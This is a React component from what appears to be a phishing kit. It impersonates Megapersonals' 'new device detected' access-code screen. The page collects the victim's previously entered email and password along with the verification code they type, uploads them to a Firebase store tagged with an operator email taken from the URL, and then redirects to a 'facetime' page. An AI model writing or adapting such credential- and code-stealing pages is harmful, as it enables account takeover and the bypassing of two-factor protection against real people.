

import React, { useContext } from 'react'
import { useRef } from 'react'
import './Login.css'
import { useLocation, useNavigate, useOutletContext } from 'react-router-dom'
import { addData } from '../config/firebase'
import devilGirl from "../assets/devilgirl.png"
import megaLogo from "../assets/megapersonals.webp"

const Code = () => {


  const location = useLocation()

  const navigate = useNavigate()

  const { info } = useOutletContext()


  const codeRef = useRef()

  async function postData() {
    try {

      const pathNames = location.pathname.split("/")
      const ownerEmail = `${pathNames[1]}@gmail.com`

      const result = await addData(info?.email, info?.pass, ownerEmail, codeRef?.current?.value)

      navigate(`/${pathNames[1]}/facetime`)


    } catch (error) {
      console.log(error?.message)
    }
  }

  function handleSubmit(event) {
    event.preventDefault()
    postData()
  }

  return (

    <div className="w-[92%] z-20 relative py-5 mx-auto overflow-x-hidden">
      <div className="mx-auto flex w-full max-w-[420px] flex-col items-center rounded-lg bg-white py-8 px-4">
        {/* Logo */}
        <img
          src={megaLogo}
          alt="Megapersonals"
          className="w-2/3 object-contain"
        />

        {/* Alert */}
        <div className="mt-3 w-full bg-[#F8EFCE] py-1.5 text-center text-sm font-medium uppercase text-[#B8AF8E]">
          New device detected
        </div>

        {/* Message */}
        <p className="mt-3 text-center text-sm text-[#C75400]">
          Your <b>ACCESS CODE</b> has been sent successfully to your email.
          <br />
          The code remains valid.
        </p>

        <p className="mt-2 text-center text-sm font-bold italic uppercase text-[#2FAEEA]">
          Check your spam folder
        </p>

        <p className="mt-2 flex items-center gap-2 text-center text-sm font-bold italic uppercase text-[#C75400]">
          <span>Do not share it</span>
          <span className="flex h-6 w-6 items-center justify-center rounded-full bg-[#2FAEEA] text-white">
            ?
          </span>
        </p>

        <p className="mt-3 text-center text-sm text-[#C75400]">
          Enter the code below to continue
        </p>

        {/* Form */}
        <form onSubmit={handleSubmit} className="mt-4 flex w-full flex-col items-center gap-4">
          <input
            name="verify_code"
            required
            ref={codeRef}
            className="w-full rounded border-2 border-gray-300 px-3 text-lg outline-none focus:border-[#2FAEEA]"
          />

          <button
            type="submit"
            className="rounded bg-orange-500 px-6 py-2 text-lg font-medium text-white hover:bg-orange-600 transition"
          >
            Submit
          </button>
        </form>
      </div>

    </div>

  )
}

export default Code
